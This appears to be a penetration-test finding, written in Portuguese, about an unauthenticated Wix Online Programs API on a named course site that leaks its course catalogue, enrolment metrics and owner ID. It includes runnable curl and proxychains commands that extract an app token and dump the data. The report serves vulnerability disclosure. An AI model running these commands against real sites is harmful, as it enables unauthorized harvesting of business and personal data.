@@ -1,0 +1,76 @@
+# FINDING F-004 — Catálogo completo de cursos + métricas de alunos + PII do owner vazados via challenge-service-web API (Wix Online Programs)
+
+## Severidade: ALTA
+
+## Resumo
+A API `/_api/challenge-service-web/api/v1/challenges` (Wix Online Programs / "challenges-web-ooi") expõe sem autenticação de usuário (apenas com o `instance` token do app Wix Online Programs, vazado publicamente via `/_api/v2/dynamicmodel` — ver F-002) o catálogo completo de **30 cursos pagos** com: descrições completas, preços, contagem de etapas, dados do owner do site, e — mais sensível — **métricas de participantes por curso** (nº de inscritos, em andamento, concluintes, convites, etc.).
+
+## Endpoints
+```
+GET https://www.cursosprepare.com/_api/challenge-service-web/api/v1/challenges
+  → HTTP 200, 72KB, totalCount: 30, memberChallenges[30]
+GET https://www.cursosprepare.com/_api/challenge-service-web/api/v1/challenges/{challengeUUID}
+  → HTTP 200, detalhe de 1 curso (descrição, preço, owner, métricas)
+GET https://www.cursosprepare.com/_api/challenge-service-web/api/v1/participants/{challengeUUID}
+  → HTTP 403 PERMISSION_DENIED (protegido — requer owner/participante)
+POST https://www.cursosprepare.com/_api/challenge-service-web/api/v1/challenges/{challengeUUID}/steps
+  → HTTP 400 "actionId is not a valid GUID" (requer actionId de enrollment — conteúdo das aulas NÃO exposto)
+```
+Rota via edge Wix apex `--resolve www.cursosprepare.com:443:185.230.63.171`.
+Header `instance: <Online Programs app instance token>` obtido de `/_api/v2/dynamicmodel` (sem auth).
+
+## Dados vazados por curso
+- `id` (UUID do curso)
+- `owners[].id` / `fullName` / `userId` → **siteOwner f6283dba-6561-4bbc-873f-b2dcecda1f5d ("Cursos Prepare")** exposto em TODOS os 30 cursos (PII do dono do site)
+- `settings.description.title` e `details` → ementa/descrição completa do curso
+- `settings.pricing.singlePayment.price.amount` / `currency` → preço (R$ 40 a R$ 280)
+- `settings.accessRestrictions.accessType` = "PUBLIC" (confirma que challenge-pages são landing pages públicas — ver F-003)
+- `stepsSummary.stepsNumber` / `sectionsNumber` → nº de aulas/etapas por curso
+- **`participantsSummary`** → MÉTRICAS DE NEGÓCIO por curso:
+  - `participantsNumber` (inscritos), `inProgressCount`, `finishedCount`, `joinRequestsNumber`, `invitationsNumber`, `paymentWaitingCount`, `notStartedCount`, `autoRemovedCount`
+- `transitions[].state` (PUBLISHED) + `occurredAt` → datas de publicação
+
+## Métricas agregadas (info disclosure de business intelligence)
+- Total de cursos: 30
+- Total de participantes (inscritos): **129**
+- Em andamento: **109**
+- Concluídos: **6**
+- Curso com mais inscritos: "Prefeitura de Silveira Martins" (28) e "Brigada Militar - RS - Temporário" (18)
+- Faixa de preço: R$ 40 a R$ 280 (catálogo de pricing completo)
+
+## Membros notáveis (owner)
+- Owner de TODOS os 30 cursos: `Cursos Prepare` (id `f6283dba-6561-4bbc-873f-b2dcecda1f5d` = siteOwnerId) — confirma identidade do dono do site e que esta conta é a proprietária de todo o catálogo.
+
+## Impacto
+- **Business intelligence vazada**: número exato de inscritos por curso, taxa de conclusão (6/129 = ~4,6%), distribuição de receita por curso (preço × inscritos). Competidores poderiam usar para precificação/estratégia; vazamento de métricas comerciais sensíveis.
+- **PII do owner**: id do site owner + nome exposto em todos os cursos.
+- **Catálogo completo de pricing/descrições**: facilita cópia de catálogo por concorrentes.
+- Combinado com F-001 (membros) e F-002 (tokens), permite perfilamento completo do negócio (alunos + cursos + métricas + owner) sem qualquer credencial legítima.
+
+## Reprodução
+```bash
+# 1. Obter tokens (sem auth)
+proxychains4 -q curl -s --resolve www.cursosprepare.com:443:185.230.63.171 \
+  https://www.cursosprepare.com/_api/v2/dynamicmodel -o dm.json
+# 2. Extrair instance token do app Online Programs (id 2936472a-a1ed-4ae5-9f71-614313a9f4e7)
+OP_INST=$(python3 -c "import json;print(json.load(open('dm.json'))['apps']['2936472a-a1ed-4ae5-9f71-614313a9f4e7']['instance'])")
+# 3. Dump do catálogo com métricas
+proxychains4 -q curl -s --resolve www.cursosprepare.com:443:185.230.63.171 \
+  -H "instance: $OP_INST" \
+  https://www.cursosprepare.com/_api/challenge-service-web/api/v1/challenges -o catalog.json
+python3 -c "import json;d=json.load(open('catalog.json'));print('cursos:',len(d['memberChallenges']),'total inscritos:',sum(e['challenge']['participantsSummary']['participantsNumber'] for e in d['memberChallenges']))"
+```
+
+## Evidência
+- `webapp/challenges_catalog_full.json` — dump completo (30 cursos, 72KB)
+- `webapp/catalog_summary.txt` — tabela resumo (curso, etapas, inscritos, em-andamento, concluídos, preço)
+- `webapp/cs_chal_id.json` — detalhe de 1 curso
+- `webapp/tokens_fresh.json` — tokens obtidos em runtime
+
+## CVSS
+AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 (Alta) — exposição de métricas de negócio + PII do owner + catálogo de pricing sem auth.
+
+## Recomendação
+- Requerer autenticação (owner/staff) para `/_api/challenge-service-web/api/v1/challenges` quando acessado por visitantes não-proprietários; ou remover `participantsSummary`/`owners` das respostas a visitantes.
+- Não expor `instance` tokens de apps em `/_api/v2/dynamicmodel` a visitantes anônimos (ver F-002).
+- Migrar `participantsSummary` para um endpoint separado autorizado apenas ao owner.
